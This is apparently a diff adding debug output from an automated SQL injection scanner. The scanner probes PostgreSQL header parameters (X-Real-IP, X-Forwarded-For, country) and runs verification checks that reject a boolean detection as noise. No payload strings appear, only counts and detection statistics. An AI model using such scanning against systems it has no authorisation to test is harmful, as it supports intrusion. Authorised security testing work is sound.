+    [EH-error] [PostgreSQL] req#128 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#383)
+    [EH-error] [PostgreSQL] req#123 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#384)
+    [EH-error] [PostgreSQL] req#131 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#385)
+    [EH-error] [PostgreSQL] req#124 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#386)
+    [EH-error] [PostgreSQL] req#129 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#387)
+    [EH-error] [PostgreSQL] req#132 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#388)
+    [EH-error] [PostgreSQL] req#125 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#389)
+    [EH-error] [PostgreSQL] req#130 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#390)
+    [EH-error] [PostgreSQL] req#133 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#391)
+    [EH-error] [PostgreSQL] req#126 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#392)
+    [EH-error] [PostgreSQL] req#131 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#393)
+    [EH-error] [PostgreSQL] req#134 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#394)
+    [EH-error] [PostgreSQL] req#132 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#395)
+    [EH-error] [PostgreSQL] req#127 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#396)
+    [EH-error] [PostgreSQL] req#135 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#397)
+    [EH-error] [PostgreSQL] req#133 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#398)
+    [EH-error] [PostgreSQL] req#128 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#399)
+    [EH-error] [PostgreSQL] req#136 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#400)
+    [EH-error] [PostgreSQL] req#134 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#401)
+    [EH-error] [PostgreSQL] req#129 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#402)
+    [EH-error] [PostgreSQL] req#137 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#403)
+    [EH-error] [PostgreSQL] req#135 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#404)
+    [EH-error] [PostgreSQL] req#130 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#405)
+    [EH-error] [PostgreSQL] req#136 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#406)
+    [EH-error] [PostgreSQL] req#138 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#407)
+    [EH-error] [PostgreSQL] req#137 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#408)
+    [EH-error] [PostgreSQL] req#131 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#409)
+    [EH-error] [PostgreSQL] req#138 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#410)
+    [EH-error] [PostgreSQL] req#139 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#411)
+    [EH-error] [PostgreSQL] req#132 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#412)
+    [EH-error] [PostgreSQL] req#140 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#413)
+    [EH-error] [PostgreSQL] req#139 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#414)
+    [EH-error] [PostgreSQL] req#133 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#415)
+    [EH-error] [PostgreSQL] req#141 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#416)
+    [EH-error] [PostgreSQL] req#140 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#417)
+    [EH-error] [PostgreSQL] req#134 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#418)
+    [EH-error] [PostgreSQL] req#142 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#419)
+    [EH-error] [PostgreSQL] req#141 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#420)
+    [EH-error] [PostgreSQL] req#135 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#421)
+    [EH-error] [PostgreSQL] req#143 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#422)
+    [EH-error] [PostgreSQL] req#142 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#423)
+    [EH-error] [PostgreSQL] req#136 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#424)
+    [EH-error] [PostgreSQL] req#144 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#425)
+    [EH-error] [PostgreSQL] req#143 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#426)
+    [EH-error] [PostgreSQL] req#137 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#427)
+    [EH-error] [PostgreSQL] req#145 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#428)
+    [EH-error] [PostgreSQL] req#144 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#429)
+    [EH-error] [PostgreSQL] req#138 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#430)
+    [EH-error] [PostgreSQL] req#145 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#431)
+    [EH-error] [PostgreSQL] req#146 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#432)
+    [EH-error] [PostgreSQL] req#139 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#433)
+    [EH-error] [PostgreSQL] req#146 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#434)
+    [EH-error] [PostgreSQL] req#147 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#435)
+    [EH-error] [PostgreSQL] req#140 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#436)
+    [EH-error] [PostgreSQL] req#147 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#437)
+    [EH-error] [PostgreSQL] req#148 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#438)
+    [EH-error] [PostgreSQL] req#141 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#439)
+    [EH-error] [PostgreSQL] req#149 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#440)
+    [EH-error] [PostgreSQL] req#148 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#441)
+    [EH-error] [PostgreSQL] req#142 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#442)
+    [EH-error] [PostgreSQL] req#149 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#443)
+    [EH-error] [PostgreSQL] req#143 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#444)
+    [EH-error] [PostgreSQL] req#150 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#445)
+    [EH-error] [PostgreSQL] req#150 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#446)
+    [EH-error] [PostgreSQL] req#144 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#447)
+    [EH-error] [PostgreSQL] req#151 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#448)
+    [EH-error] [PostgreSQL] req#145 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#449)
+    [EH-error] [PostgreSQL] req#152 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#450)
+    [EH-error] [PostgreSQL] req#151 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#451)
+    [EH-error] [PostgreSQL] req#146 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#452)
+    [EH-error] [PostgreSQL] req#153 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#453)
+    [EH-error] [PostgreSQL] req#152 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#454)
+    [EH-error] [PostgreSQL] req#147 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#455)
+    [EH-error] [PostgreSQL] req#154 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#456)
+    [EH-error] [PostgreSQL] req#153 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#457)
+    [EH-error] [PostgreSQL] req#148 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#458)
+    [EH-error] [PostgreSQL] req#155 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#459)
+    [EH-error] [PostgreSQL] req#154 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#460)
+    [EH-error] [PostgreSQL] req#149 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#461)
+    [EH-error] [PostgreSQL] req#156 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#462)
+    [EH-error] [PostgreSQL] req#155 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#463)
+    [EH-error] [PostgreSQL] req#150 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#464)
+    [EH-error] [PostgreSQL] req#157 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#465)
+    [EH-error] [PostgreSQL] req#156 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#466)
+    [EH-error] [PostgreSQL] req#151 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#467)
+    [EH-error] [PostgreSQL] req#158 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#468)
+    [EH-error] [PostgreSQL] req#157 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#469)
+    [EH-error] [PostgreSQL] req#159 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#470)
+    [EH-error] [PostgreSQL] req#158 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#471)
+    [EH-error] [PostgreSQL] req#152 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#472)
+    [EH-error] [PostgreSQL] req#159 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#473)
+    [EH-error] [PostgreSQL] req#160 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#474)
+    [EH-error] [PostgreSQL] req#153 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#475)
+    [EH-error] [PostgreSQL] req#161 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#476)
+    [EH-error] [PostgreSQL] req#160 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#477)
+    [EH-error] [PostgreSQL] req#162 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#478)
+    [EH-error] [PostgreSQL] req#154 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#479)
+    [EH-error] [PostgreSQL] req#161 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#480)
+    [EH-error] [PostgreSQL] req#163 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#481)
+    [EH-error] [PostgreSQL] req#155 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#482)
+    [EH-error] [PostgreSQL] req#162 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#483)
+    [EH-error] [PostgreSQL] req#164 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#484)
+    [EH-error] [PostgreSQL] req#156 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#485)
+    [EH-error] [PostgreSQL] req#163 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#486)
+    [EH-error] [PostgreSQL] req#165 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#487)
+    [EH-error] [PostgreSQL] req#157 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#488)
+    [EH-error] [PostgreSQL] req#164 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#489)
+    [EH-error] [PostgreSQL] req#166 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#490)
+    [EH-error] [PostgreSQL] req#158 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#491)
+    [EH-error] [PostgreSQL] req#165 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#492)
+    [EH-error] [PostgreSQL] req#167 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#493)
+    [EH-error] [PostgreSQL] req#159 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#494)
+    [EH-error] [PostgreSQL] req#166 err=False status=400  no error
+    [EH-error] [PostgreSQL] req#168 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#495)
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#496)
+    [EH-error] [PostgreSQL] req#167 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#497)
+    [EH-error] [PostgreSQL] req#160 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#498)
+    [EH-error] [PostgreSQL] req#169 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#499)
+    [EH-error] [PostgreSQL] req#168 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#500)
+    [EH-error] [PostgreSQL] req#161 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#501)
+    [EH-error] [PostgreSQL] req#170 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#502)
+    [EH-error] [PostgreSQL] req#162 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#503)
+    [EH-error] [PostgreSQL] req#171 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#504)
+    [EH-error] [PostgreSQL] req#169 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#505)
+    [EH-error] [PostgreSQL] req#172 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#506)
+    [EH-error] [PostgreSQL] req#170 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#507)
+    [EH-error] [PostgreSQL] req#163 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#508)
+    [EH-error] [PostgreSQL] req#173 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#509)
+    [EH-error] [PostgreSQL] req#171 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#510)
+    [EH-error] [PostgreSQL] req#164 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#511)
+    [EH-error] [PostgreSQL] req#174 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#512)
+    [EH-error] [PostgreSQL] req#172 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#513)
+    [EH-error] [PostgreSQL] req#165 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#514)
+    [EH-error] [PostgreSQL] req#175 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#515)
+    [EH-error] [PostgreSQL] req#173 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#516)
+    [EH-error] [PostgreSQL] req#166 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#517)
+    [EH-error] [PostgreSQL] req#176 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#518)
+    [EH-error] [PostgreSQL] req#174 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#519)
+    [EH-error] [PostgreSQL] req#167 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#520)
+    [EH-error] [PostgreSQL] req#177 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#521)
+    [EH-error] [PostgreSQL] req#168 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#522)
+    [EH-error] [PostgreSQL] req#175 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#523)
+    [EH-error] [PostgreSQL] req#169 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#524)
+    [EH-error] [PostgreSQL] req#176 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#525)
+    [EH-error] [PostgreSQL] req#178 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#526)
+    [EH-error] [PostgreSQL] req#170 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#527)
+    [EH-error] [PostgreSQL] req#177 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#528)
+    [EH-error] [PostgreSQL] req#179 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#529)
+    [EH-error] [PostgreSQL] req#171 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#530)
+    [EH-error] [PostgreSQL] req#178 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#531)
+    [EH-error] [PostgreSQL] req#180 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#532)
+    [EH-error] [PostgreSQL] req#172 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#533)
+    [EH-error] [PostgreSQL] req#179 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#534)
+    [EH-error] [PostgreSQL] req#173 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#535)
+    [EH-error] [PostgreSQL] req#180 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#536)
+    [EH-error] [PostgreSQL] req#174 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#537)
+    [EH-error] [PostgreSQL] req#181 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#538)
+    [EH-error] [PostgreSQL] req#175 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#539)
+    [EH-error] [PostgreSQL] req#182 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#540)
+    [EH-error] [PostgreSQL] req#181 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#541)
+    [EH-error] [PostgreSQL] req#176 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#542)
+    [EH-error] [PostgreSQL] req#182 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#543)
+    [EH-error] [PostgreSQL] req#183 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#544)
+    [EH-error] [PostgreSQL] req#177 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#545)
+    [EH-error] [PostgreSQL] req#183 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#546)
+    [EH-error] [PostgreSQL] req#184 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#547)
+    [EH-error] [PostgreSQL] req#178 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#548)
+    [EH-error] [PostgreSQL] req#184 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#549)
+    [EH-error] [PostgreSQL] req#185 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#550)
+    [EH-error] [PostgreSQL] req#185 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#551)
+    [EH-error] [PostgreSQL] req#179 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#552)
+    [EH-error] [PostgreSQL] req#186 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#553)
+    [EH-error] [PostgreSQL] req#186 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#554)
+    [EH-error] [PostgreSQL] req#180 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#555)
+    [EH-error] [PostgreSQL] req#187 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#556)
+    [EH-error] [PostgreSQL] req#187 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#557)
+    [EH-error] [PostgreSQL] req#188 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#558)
+    [EH-error] [PostgreSQL] req#181 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#559)
+    [EH-error] [PostgreSQL] req#188 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#560)
+    [EH-error] [PostgreSQL] req#189 err=False status=400  no error
+[*] [TECH-NODIFF] PostgreSQL:EH: 100 consecutive no-diff responses — rotating to next tech
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 577 base payloads (2895 expanded)
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#561)
+    [EH-error] [PostgreSQL] req#189 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#562)
+    [EH-error] [PostgreSQL] req#182 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#563)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#190 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#191)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#564)
+    [EH-error] [PostgreSQL] req#183 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#565)
+    [EH-error] [PostgreSQL] req#190 err=False status=400  no error
+[*] [TECH-NODIFF] PostgreSQL:EH: 100 consecutive no-diff responses — rotating to next tech
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 577 base payloads (2895 expanded)
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#566)
+    [EH-error] [PostgreSQL] req#184 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#567)
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#568)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#193 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [EH-error] [PostgreSQL] req#185 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#569)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#191 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#192)
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#570)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#194)
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#571)
+    [EH-error] [PostgreSQL] req#186 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#572)
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#573)
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#574)
+    [EH-error] [PostgreSQL] req#187 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#575)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#194 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#196 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#197)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6795, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#195)
+[*] [diag] _try_technique: tech=ST dbms=PostgreSQL templates=2895 → testing 579 payloads
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [CTX-bool] order_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] order_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+    [EH-error] [PostgreSQL] req#188 err=False status=400  no error
+    [CTX-bool] order_by: sim_t=0.500 sim_f=0.500 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=0.500 sim_f=0.500 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=0.500 sim_f=0.500 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=0.500 sim_f=1.000 gap=-0.500 need=0.250  CONFIRMED (1/6)  [reversed-polarity]
+    [CTX-bool] multi-probe FAILED (1/3)
+    [CTX-bool] group_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] group_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+[*]     Check A (body canary): PASS  via LENGTH (structural fallback)+SUBSTRING-num gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (1.000)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[!] PCV FAILED for bypass [ST] PostgreSQL  trying plain payloads...
+[*] [diag] _try_technique: tech=ST dbms=PostgreSQL templates=2895 → testing 579 payloads
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#576)
+[*]     Check A (body canary): PASS  via SUBSTRING (derived)+SUBSTRING gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof, all body checks unreliable
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#198 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#199)
